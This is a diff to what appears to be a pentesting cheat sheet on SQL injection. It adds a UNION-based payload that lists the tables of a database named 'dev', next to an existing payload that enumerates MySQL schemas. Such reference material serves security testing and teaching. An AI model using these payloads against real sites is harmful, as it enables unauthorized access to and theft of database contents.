@@ -25,6 +25,10 @@ Enumerate Mysql Databases
 ```
 ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
+Enumerate all tables from database-dev
+```
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
 ### Blind Sql Injection
 ###### Time-Based
 ###### Boolean-Based
